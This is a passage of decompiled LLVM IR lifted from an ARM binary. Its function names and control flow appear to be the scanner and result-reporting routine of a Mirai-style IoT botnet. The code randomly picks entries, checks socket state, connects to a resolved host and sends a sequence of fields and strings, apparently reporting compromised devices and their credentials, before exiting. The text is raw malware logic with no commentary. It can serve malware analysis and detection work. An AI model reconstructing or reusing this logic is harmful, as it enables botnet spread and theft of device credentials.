  %v1_fe9c = call i32 @__GI___libc_close(i32 %v3_fe98)
  %v0_fea0 = load i32, i32* @r6, align 4
  %v1_fea0 = add i32 %v0_fea0, 384
  %v2_fea0 = inttoptr i32 %v1_fea0 to i8*
  %v3_fea0 = load i8, i8* %v2_fea0, align 1
  %v4_fea0 = zext i8 %v3_fea0 to i32
  %v1_fea4 = add nuw nsw i32 %v4_fea0, 1
  %v1_fea8 = urem i32 %v1_fea4, 256
  store i32 %v1_fea8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_feb0 = icmp ugt i32 %v1_fea8, 9
  store i1 %v2_feb0, i1* %cpsr_c.global-to-local, align 1
  %v7_feb0 = icmp eq i32 %v1_fea8, 10
  store i1 %v7_feb0, i1* %cpsr_z.global-to-local, align 1
  %v2_feb4 = add i32 %v0_fea0, 4
  %v3_feb4 = inttoptr i32 %v2_feb4 to i32*
  store i32 -1, i32* %v3_feb4, align 4
  %v0_feb8 = load i32, i32* @r3, align 4
  %v1_feb8 = trunc i32 %v0_feb8 to i8
  %v2_feb8 = load i32, i32* @r6, align 4
  %v3_feb8 = add i32 %v2_feb8, 384
  %v4_feb8 = inttoptr i32 %v3_feb8 to i8*
  store i8 %v1_feb8, i8* %v4_feb8, align 1
  %v0_febc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_febc, label %dec_label_pc_fec0, label %dec_label_pc_ff1c

dec_label_pc_fec0:                                ; preds = %dec_label_pc_fe90
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r7, align 4
  %v1_fec8 = load i32, i32* @r6, align 4
  %v2_fec8 = add i32 %v1_fec8, 12
  %v3_fec8 = inttoptr i32 %v2_fec8 to i32*
  store i32 0, i32* %v3_fec8, align 4
  %v0_fecc = load i32, i32* @r3, align 4
  %v1_fecc = trunc i32 %v0_fecc to i8
  %v2_fecc = load i32, i32* @r6, align 4
  %v3_fecc = add i32 %v2_fecc, 384
  %v4_fecc = inttoptr i32 %v3_fecc to i8*
  store i8 %v1_fecc, i8* %v4_fecc, align 1
  br label %dec_label_pc_f640

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fe04
  store i32 %v2_fdc4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_fee0 = add i32 %v0_fdf0, 4
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  %v3_fee0 = load i32, i32* %v2_fee0, align 4
  %v4_fee4 = call i32 @__libc_send(i32 %v3_fee0, i32 %v2_fdc4, i32 3, i32 16384)
  br label %dec_label_pc_f7e0

dec_label_pc_fef8:                                ; preds = %dec_label_pc_f3f8
  store i32 %.pre, i32* @r0, align 4
  %v1_ff00 = add i32 %v0_fef8, 92
  store i32 %v1_ff00, i32* @r1, align 4
  store i32 292, i32* @r2, align 4
  %v3_ff08 = call i32 @memmove(i32 %.pre, i32 %v1_ff00, i32 292)
  %v0_ff0c = load i32, i32* @r6, align 4
  %v1_ff0c = add i32 %v0_ff0c, 24
  %v2_ff0c = inttoptr i32 %v1_ff0c to i32*
  %v3_ff0c = load i32, i32* %v2_ff0c, align 4
  %v1_ff10 = add i32 %v3_ff0c, -64
  store i32 %v1_ff10, i32* %r3.global-to-local, align 4
  store i32 %v1_ff10, i32* %v2_ff0c, align 4
  br label %dec_label_pc_f408

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_fe90
  %v0_ff1c = load i32, i32* @r6, align 4
  store i32 %v0_ff1c, i32* @r0, align 4
  %v0_ff20 = call i32 @setup_connection()
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f640

dec_label_pc_ff2c:                                ; preds = %dec_label_pc_f3b0
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_eb9c, i32* %r3.global-to-local, align 4
  store i32 %v2_fd30, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_ff54 = call i32 @getsockopt(i32 %v3_f3a4, i32 1, i32 4, i32 %v2_eb9c, i32 %v2_fd30)
  %v3_ff58 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_ff58, i32* %r3.global-to-local, align 4
  %v2_ff5c = or i32 %v3_ff58, %v5_ff54
  %v4_ff5c = icmp eq i32 %v2_ff5c, 0
  store i1 %v4_ff5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ff5c, label %dec_label_pc_ff64, label %dec_label_pc_fff0

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff2c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_ff68 = load i32, i32* @r6, align 4
  %v2_ff68 = add i32 %v1_ff68, 12
  %v3_ff68 = inttoptr i32 %v2_ff68 to i32*
  store i32 2, i32* %v3_ff68, align 4
  %v0_ff6c = call i32 @rand_next()
  %v2_ff74 = load i16, i16* bitcast (i16** @global_var_21f80.148 to i16*), align 4
  %v3_ff74 = zext i16 %v2_ff74 to i32
  %v3_ff78 = urem i32 %v0_ff6c, %v3_ff74
  store i32 ptrtoint (i32* @global_var_21f50.144 to i32), i32* %r3.global-to-local, align 4
  %v2_ff80 = load i32, i32* @global_var_21f50.144, align 4
  store i32 %v2_ff80, i32* %ip.global-to-local, align 4
  %v1_ff88 = load i32, i32* @r4, align 4
  %v9_ff88 = icmp eq i32 %v2_ff80, %v1_ff88
  store i1 %v9_ff88, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_ff78, i32* %r1.global-to-local, align 4
  %v7_ff90 = icmp sgt i32 %v2_ff80, %v1_ff88
  br i1 %v7_ff90, label %dec_label_pc_ff94, label %dec_label_pc_ffcc

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff64
  %v2_ff98 = load i32, i32* @global_var_21f7c.146, align 4
  store i32 %v2_ff98, i32* %r3.global-to-local, align 4
  store i32 %v1_ff88, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ffa0

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ffbc, %dec_label_pc_ff94
  %v0_ffbc = phi i32 [ %v1_ffbc, %dec_label_pc_ffbc ], [ %v1_ff88, %dec_label_pc_ff94 ]
  %v0_ffc4 = phi i32 [ %v1_ffc4, %dec_label_pc_ffbc ], [ %v2_ff98, %dec_label_pc_ff94 ]
  %v1_ffa4 = add i32 %v0_ffc4, 8
  %v2_ffa4 = inttoptr i32 %v1_ffa4 to i16*
  %v3_ffa4 = load i16, i16* %v2_ffa4, align 2
  %v4_ffa4 = zext i16 %v3_ffa4 to i32
  store i32 %v4_ffa4, i32* %r3.global-to-local, align 4
  %tmp459 = icmp ugt i32 %v4_ffa4, %v3_ff78
  br i1 %tmp459, label %dec_label_pc_ffbc, label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ffa0
  %v1_ffb0 = add i32 %v0_ffc4, 10
  %v2_ffb0 = inttoptr i32 %v1_ffb0 to i16*
  %v3_ffb0 = load i16, i16* %v2_ffb0, align 2
  %v4_ffb0 = zext i16 %v3_ffb0 to i32
  store i32 %v4_ffb0, i32* %r3.global-to-local, align 4
  %v3_ffb4 = icmp uge i32 %v4_ffb0, %v3_ff78
  %v9_ffb4 = icmp eq i32 %v4_ffb0, %v3_ff78
  %v2_ffb8 = xor i1 %v9_ffb4, true
  %v3_ffb8 = and i1 %v3_ffb4, %v2_ffb8
  br i1 %v3_ffb8, label %dec_label_pc_ffd0.loopexit, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ffb0, %dec_label_pc_ffa0
  %v1_ffbc = add i32 %v0_ffbc, 1
  store i32 %v1_ffbc, i32* %r2.global-to-local, align 4
  %v9_ffc0 = icmp eq i32 %v1_ffbc, %v2_ff80
  %v1_ffc4 = add i32 %v0_ffc4, 16
  store i32 %v1_ffc4, i32* %r3.global-to-local, align 4
  br i1 %v9_ffc0, label %dec_label_pc_ffcc.loopexit, label %dec_label_pc_ffa0

dec_label_pc_ffcc.loopexit:                       ; preds = %dec_label_pc_ffbc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffcc

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ffcc.loopexit, %dec_label_pc_ff64
  br label %dec_label_pc_ffd0

dec_label_pc_ffd0.loopexit:                       ; preds = %dec_label_pc_ffb0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_ffb4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffd0

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ffd0.loopexit, %dec_label_pc_ffcc
  %v0_ffe4 = phi i32 [ %v0_ffc4, %dec_label_pc_ffd0.loopexit ], [ 0, %dec_label_pc_ffcc ]
  %v0_ffd0 = load i32, i32* @r6, align 4
  %v1_ffd0 = add i32 %v0_ffd0, 4
  %v2_ffd0 = inttoptr i32 %v1_ffd0 to i32*
  %v3_ffd0 = load i32, i32* %v2_ffd0, align 4
  %v3_ffd4 = udiv i32 %v3_ffd0, 32
  store i32 %v3_ffd4, i32* %r2.global-to-local, align 4
  %v1_ffd8 = urem i32 %v3_ffd0, 32
  store i32 %v1_ffd8, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_ffdc = mul nuw nsw i32 %v3_ffd4, 4
  store i32 %v3_ffdc, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ffe4 = inttoptr i32 %v0_ffd0 to i32*
  store i32 %v0_ffe4, i32* %v2_ffe4, align 4
  %v0_ffe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ffe8 = load i32, i32* @r6, align 4
  %v2_ffe8 = add i32 %v1_ffe8, 24
  %v3_ffe8 = inttoptr i32 %v2_ffe8 to i32*
  store i32 %v0_ffe8, i32* %v3_ffe8, align 4
  %v0_f3d8.pre = load i32, i32* @ip, align 4
  %v1_f3e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f3d4

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ff2c
  %v0_fff0 = load i32, i32* @r6, align 4
  %v1_fff0 = add i32 %v0_fff0, 4
  %v2_fff0 = inttoptr i32 %v1_fff0 to i32*
  %v3_fff0 = load i32, i32* %v2_fff0, align 4
  %v1_fff4 = call i32 @__GI___libc_close(i32 %v3_fff0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fffc = load i32, i32* @r4, align 4
  %v1_fffc = load i32, i32* @r6, align 4
  %v2_fffc = add i32 %v1_fffc, 12
  %v3_fffc = inttoptr i32 %v2_fffc to i32*
  store i32 %v0_fffc, i32* %v3_fffc, align 4
  %v0_10000 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000 = load i32, i32* @r6, align 4
  %v2_10000 = add i32 %v1_10000, 4
  %v3_10000 = inttoptr i32 %v2_10000 to i32*
  store i32 %v0_10000, i32* %v3_10000, align 4
  %v0_10004 = load i32, i32* @r4, align 4
  %v1_10004 = trunc i32 %v0_10004 to i8
  %v2_10004 = load i32, i32* @r6, align 4
  %v3_10004 = add i32 %v2_10004, 384
  %v4_10004 = inttoptr i32 %v3_10004 to i8*
  store i8 %v1_10004, i8* %v4_10004, align 1
  br label %dec_label_pc_f4fc

dec_label_pc_1000c:                               ; preds = %dec_label_pc_f5f8
  store i32 %v2_f5a8, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_10018 = add i32 %v1_f614, 4
  %v2_10018 = inttoptr i32 %v1_10018 to i32*
  %v3_10018 = load i32, i32* %v2_10018, align 4
  store i32 %v3_10018, i32* @r4, align 4
  %v0_1001c = call i32 @rand_next()
  %v0_10020 = load i32, i32* @r5, align 4
  %v1_10020 = inttoptr i32 %v0_10020 to i8*
  %v2_10020 = load i8, i8* %v1_10020, align 1
  %v3_10020 = zext i8 %v2_10020 to i32
  %v3_10024 = urem i32 %v0_1001c, %v3_10020
  store i32 %v3_10024, i32* %r1.global-to-local, align 4
  %v0_10028 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10028 = mul nuw nsw i32 %v3_10024, 4
  %v5_10028 = add i32 %v0_10028, %v4_10028
  %v6_10028 = inttoptr i32 %v5_10028 to i32*
  %v7_10028 = load i32, i32* %v6_10028, align 4
  store i32 %v7_10028, i32* %r3.global-to-local, align 4
  %v0_10030 = load i32, i32* @sl, align 4
  store i32 %v0_10030, i32* %r1.global-to-local, align 4
  %v2_10038 = inttoptr i32 %v0_10030 to i32*
  %v3_10038 = call i32 @table_retrieve_val(i32 4, i32* %v2_10038)
  store i32 %v2_f5a8, i32* %ip.global-to-local, align 4
  %v0_10048 = load i32, i32* @r5, align 4
  %v1_1004c = call i32 @resolv_entries_free(i32 %v0_10048)
  %v1_10054 = call i32 @table_lock_val(i32 3)
  %v1_1005c = call i32 @table_lock_val(i32 4)
  %v0_10064 = load i32, i32* @r8, align 4
  store i32 %v2_10068, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10070 = call i32 @__libc_connect(i32 %v0_10064, i32 %v2_10068, i32 16)
  %v3_10074 = icmp eq i32 %v3_10070, -1
  store i1 %v3_10074, i1* %cpsr_c.global-to-local, align 1
  %v8_10074 = icmp eq i32 %v3_10070, -1
  store i1 %v8_10074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10074, label %dec_label_pc_1007c, label %dec_label_pc_1008c

dec_label_pc_1007c:                               ; preds = %dec_label_pc_1000c
  %v0_1007c = load i32, i32* @r8, align 4
  %v1_10080 = call i32 @__GI___libc_close(i32 %v0_1007c)
  %v0_10084 = load i32, i32* @sl, align 4
  %v1_10088 = call i32 @__GI_exit(i32 %v0_10084)
  br label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_1000c, %dec_label_pc_1007c
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  %v0_10098 = load i32, i32* @r8, align 4
  %v0_1009c = load i32, i32* @sl, align 4
  store i32 %v0_1009c, i32* %stack_var_-56, align 4
  %v5_100a0 = call i32 @__libc_send(i32 %v0_10098, i32 %v2_eb9c, i32 1, i32 16384)
  store i32 %v2_fd30, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_100b4 = load i32, i32* @r8, align 4
  %v4_100b8 = call i32 @__libc_send(i32 %v0_100b4, i32 %v2_fd30, i32 4, i32 16384)
  store i32 %v2_100c0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_100cc = load i32, i32* @r8, align 4
  %v4_100d0 = call i32 @__libc_send(i32 %v0_100cc, i32 %v2_100c0, i32 2, i32 16384)
  %v0_100d4 = load i32, i32* @sb, align 4
  %v1_100d4 = add i32 %v0_100d4, 12
  store i32 %v1_100d4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_100e0 = load i32, i32* @r8, align 4
  %v4_100e4 = call i32 @__libc_send(i32 %v0_100e0, i32 %v1_100d4, i32 1, i32 16384)
  %v0_100e8 = load i32, i32* @sb, align 4
  %v1_100e8 = inttoptr i32 %v0_100e8 to i32*
  %v2_100e8 = load i32, i32* %v1_100e8, align 4
  store i32 %v2_100e8, i32* %r1.global-to-local, align 4
  %v1_100ec = add i32 %v0_100e8, 12
  %v2_100ec = inttoptr i32 %v1_100ec to i8*
  %v3_100ec = load i8, i8* %v2_100ec, align 1
  %v4_100ec = zext i8 %v3_100ec to i32
  store i32 %v4_100ec, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_100f4 = load i32, i32* @r8, align 4
  %v4_100f8 = call i32 @__libc_send(i32 %v0_100f4, i32 %v2_100e8, i32 %v4_100ec, i32 16384)
  %v0_100fc = load i32, i32* @sb, align 4
  %v1_100fc = add i32 %v0_100fc, 13
  store i32 %v1_100fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10108 = load i32, i32* @r8, align 4
  %v4_1010c = call i32 @__libc_send(i32 %v0_10108, i32 %v1_100fc, i32 1, i32 16384)
  %v0_10110 = load i32, i32* @r8, align 4
  %v0_10114 = load i32, i32* @sb, align 4
  %v1_10114 = add i32 %v0_10114, 13
  %v2_10114 = inttoptr i32 %v1_10114 to i8*
  %v3_10114 = load i8, i8* %v2_10114, align 1
  %v4_10114 = zext i8 %v3_10114 to i32
  store i32 %v4_10114, i32* %r2.global-to-local, align 4
  %v1_10118 = add i32 %v0_10114, 4
  %v2_10118 = inttoptr i32 %v1_10118 to i32*
  %v3_10118 = load i32, i32* %v2_10118, align 4
  store i32 %v3_10118, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10120 = call i32 @__libc_send(i32 %v0_10110, i32 %v3_10118, i32 %v4_10114, i32 16384)
  %v0_10124 = load i32, i32* @r8, align 4
  %v1_10128 = call i32 @__GI___libc_close(i32 %v0_10124)
  br label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %dec_label_pc_f5dc, %dec_label_pc_1008c
  %v0_1012c = load i32, i32* @sl, align 4
  %v1_10130 = call i32 @__GI_exit(i32 %v0_1012c)
  br label %dec_label_pc_10134

dec_label_pc_10134.loopexit:                      ; preds = %dec_label_pc_fb4c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10134

dec_label_pc_10134:                               ; preds = %dec_label_pc_10134.loopexit, %dec_label_pc_1012c
  %v1_10138 = call i32 @table_lock_val(i32 27)
  %v0_1013c = load i32, i32* @r6, align 4
  %v1_1013c = add i32 %v0_1013c, 12
  %v2_1013c = inttoptr i32 %v1_1013c to i32*
  %v3_1013c = load i32, i32* %v2_1013c, align 4
  br label %dec_label_pc_f3f0.backedge

dec_label_pc_f3f0.backedge.thread:                ; preds = %dec_label_pc_f668, %dec_label_pc_f80c, %dec_label_pc_f8e0, %dec_label_pc_f9b4, %dec_label_pc_fbcc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f3f8

dec_label_pc_f3f0.backedge.thread564:             ; preds = %dec_label_pc_f944, %dec_label_pc_f870, %dec_label_pc_fc30, %dec_label_pc_fa70, %dec_label_pc_f6cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f3f8

dec_label_pc_f3f0.backedge:                       ; preds = %dec_label_pc_f470, %dec_label_pc_10134, %dec_label_pc_10144
  %v0_f3f8228 = phi i32 [ %v0_10154, %dec_label_pc_10144 ], [ %v0_1013c, %dec_label_pc_10134 ], [ %v0_f470, %dec_label_pc_f470 ]
  %v0_f3f0.be = phi i32 [ %v3_10154, %dec_label_pc_10144 ], [ %v3_1013c, %dec_label_pc_10134 ], [ %v3_f470, %dec_label_pc_f470 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3f0 = icmp eq i32 %v0_f3f0.be, 0
  store i1 %v2_f3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f3f0, label %dec_label_pc_f4fc, label %dec_label_pc_f3f8

dec_label_pc_10144:                               ; preds = %dec_label_pc_fd7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_10148 = call i32 @table_lock_val(i32 28)
  %v1_10150 = call i32 @table_lock_val(i32 29)
  %v0_10154 = load i32, i32* @r6, align 4
  %v1_10154 = add i32 %v0_10154, 12
  %v2_10154 = inttoptr i32 %v1_10154 to i32*
  %v3_10154 = load i32, i32* %v2_10154, align 4
  br label %dec_label_pc_f3f0.backedge

dec_label_pc_1015c:                               ; preds = %dec_label_pc_f4a8
  store i32 %v0_f00c, i32* %r2.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f028, align 4
  br label %dec_label_pc_f4c4

dec_label_pc_1016c:                               ; preds = %dec_label_pc_eb7c
  store i32 ptrtoint (i32* @global_var_24a6c.155 to i32), i32* %r2.global-to-local, align 4
  %v2_10170 = load i32, i32* @global_var_24a6c.155, align 4
  %v1_10174 = call i32 @__GI___libc_close(i32 %v2_10170)
  br label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_eb58, %dec_label_pc_1016c
  %v0_10178 = load i32, i32* @r5, align 4
  %v1_1017c = call i32 @__GI_exit(i32 %v0_10178)
  ret i32 %v1_1017c

; uselistorder directives
  uselistorder i32 %v0_10154, { 1, 0 }
  uselistorder i32 %v3_ffd0, { 1, 0 }
  uselistorder i32 %v1_ffc4, { 1, 0 }
  uselistorder i32 %v1_ffbc, { 1, 2, 0 }
  uselistorder i1 %v9_ffb4, { 1, 0 }
  uselistorder i32 %v3_ff78, { 2, 1, 0, 3 }
  uselistorder i32 %v1_fea8, { 2, 1, 0 }
  uselistorder i32 %v0_fe24.pr, { 1, 0 }
  uselistorder i32 %v0_fdf0, { 1, 2, 0 }
  uselistorder i32 %v4_fd90, { 1, 0 }
  uselistorder i1 %v7_fd6c, { 1, 0 }
  uselistorder i32 %v1_fd14, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fd14, { 0, 2, 1 }
  uselistorder i32 %v0_fd0c, { 1, 0 }
  uselistorder i1 %v7_fd08, { 1, 0 }
  uselistorder i1 %v7_fd00, { 1, 0 }
  uselistorder i1 %v7_fcf8, { 1, 0 }
  uselistorder i1 %v8_fcf0, { 1, 0 }
  uselistorder i1 %v7_fcd4, { 1, 0 }
  uselistorder i1 %v7_fccc, { 1, 0 }
  uselistorder i1 %v7_fcc4, { 1, 0 }
  uselistorder i1 %v8_fcbc, { 1, 0 }
  uselistorder i32 %v1_fca4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fc40, { 1, 0 }
  uselistorder i8 %v3_fc38, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc30, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fc30, { 0, 2, 1 }
  uselistorder i32 %v0_fc28, { 1, 0 }
  uselistorder i1 %v7_fc24, { 1, 0 }
  uselistorder i1 %v7_fc1c, { 1, 0 }
  uselistorder i1 %v7_fc14, { 1, 0 }
  uselistorder i1 %v7_fc00, { 1, 0 }
  uselistorder i1 %v7_fbf8, { 1, 0 }
  uselistorder i1 %v7_fbf0, { 1, 0 }
  uselistorder i1 %v8_fbe8, { 1, 0 }
  uselistorder i32 %v1_fbd0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fb78, { 1, 0 }
  uselistorder i32 %v1_fb44, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fb44, { 0, 2, 1 }
  uselistorder i32 %v0_fb3c, { 1, 0 }
  uselistorder i1 %v7_fb38, { 1, 0 }
  uselistorder i1 %v7_fb30, { 1, 0 }
  uselistorder i1 %v8_fb28, { 1, 0 }
  uselistorder i1 %v7_fb0c, { 1, 0 }
  uselistorder i1 %v7_fb04, { 1, 0 }
  uselistorder i1 %v8_fafc, { 1, 0 }
  uselistorder i32 %v1_fae4, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fa80, { 1, 0 }
  uselistorder i8 %v3_fa78, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fa70, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fa70, { 0, 2, 1 }
  uselistorder i32 %v0_fa68, { 1, 0 }
  uselistorder i1 %v7_fa64, { 1, 0 }
  uselistorder i1 %v7_fa5c, { 1, 0 }
  uselistorder i1 %v7_fa54, { 1, 0 }
  uselistorder i1 %v7_f9e8, { 1, 0 }
  uselistorder i1 %v7_f9e0, { 1, 0 }
  uselistorder i1 %v7_f9d8, { 1, 0 }
  uselistorder i1 %v8_f9d0, { 1, 0 }
  uselistorder i32 %v1_f9b8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f954, { 1, 0 }
  uselistorder i8 %v3_f94c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f944, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f944, { 0, 2, 1 }
  uselistorder i32 %v0_f93c, { 1, 0 }
  uselistorder i1 %v7_f938, { 1, 0 }
  uselistorder i1 %v7_f930, { 1, 0 }
  uselistorder i1 %v7_f928, { 1, 0 }
  uselistorder i1 %v7_f914, { 1, 0 }
  uselistorder i1 %v7_f90c, { 1, 0 }
  uselistorder i1 %v7_f904, { 1, 0 }
  uselistorder i1 %v8_f8fc, { 1, 0 }
  uselistorder i32 %v1_f8e4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f880, { 1, 0 }
  uselistorder i8 %v3_f878, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f870, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f870, { 0, 2, 1 }
  uselistorder i32 %v0_f868, { 1, 0 }
  uselistorder i1 %v7_f864, { 1, 0 }
  uselistorder i1 %v7_f85c, { 1, 0 }
  uselistorder i1 %v7_f854, { 1, 0 }
  uselistorder i1 %v7_f840, { 1, 0 }
  uselistorder i1 %v7_f838, { 1, 0 }
  uselistorder i1 %v7_f830, { 1, 0 }
  uselistorder i1 %v8_f828, { 1, 0 }
  uselistorder i32 %v1_f810, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f7fc, { 1, 0 }
  uselistorder i32 %v1_f7f4, { 1, 0 }
  uselistorder i32 %v1_f7ec, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f7e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f7e8, { 0, 2, 1 }
  uselistorder i32 %v0_f7c8.pr, { 1, 0 }
  uselistorder i32 %v0_f7a8.pr, { 1, 0 }
  uselistorder i1 %v7_f780, { 1, 0 }
  uselistorder i1 %v2_f770, { 1, 0, 2 }
  uselistorder i1 %v2_f754, { 1, 0, 2 }
  uselistorder i32 %v1_f774, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f748, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f778, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f6dc, { 1, 0 }
  uselistorder i8 %v3_f6d4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f6cc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f6cc, { 0, 2, 1 }
  uselistorder i32 %v0_f6c4, { 1, 0 }
  uselistorder i1 %v7_f6c0, { 1, 0 }
  uselistorder i1 %v7_f6b8, { 1, 0 }
  uselistorder i1 %v7_f6b0, { 1, 0 }
  uselistorder i1 %v7_f69c, { 1, 0 }
  uselistorder i1 %v7_f694, { 1, 0 }
  uselistorder i1 %v7_f68c, { 1, 0 }
  uselistorder i1 %v8_f684, { 1, 0 }
  uselistorder i32 %v1_f66c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f658, { 1, 2, 0 }
  uselistorder i32 %v2_f644, { 1, 0 }
  uselistorder i32 %v0_f644, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f640, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f5ec, { 1, 0 }
  uselistorder i32 %v3_f5e8, { 1, 0, 2 }
  uselistorder i1 %v2_f5d4, { 1, 0 }
  uselistorder i32 %.464, { 1, 0 }
  uselistorder i1 %v7_f5bc, { 1, 0 }
  uselistorder i32 %v0_f5b8, { 2, 1, 0 }
  uselistorder i1 %v7_f590, { 1, 0 }
  uselistorder i32 %v0_f590, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f500, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f4e4, { 1, 0 }
  uselistorder i32 %v1_f4d4, { 2, 1, 0 }
  uselistorder i32 %v1_f4d0, { 1, 0 }
  uselistorder i32 %v0_f470, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f44c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f448, { 1, 0 }
  uselistorder i32 %v4_f42c, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32 %v2_f418, { 1, 0, 2 }
  uselistorder i32 %v3_f414, { 1, 0, 2 }
  uselistorder i32 %v0_fef8, { 1, 0, 2 }
  uselistorder i32 %v3_f3dc, { 1, 0 }
  uselistorder i32 %v1_f3c4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f3c0, { 1, 0 }
  uselistorder i32 %v3_f3b8, { 1, 2, 0 }
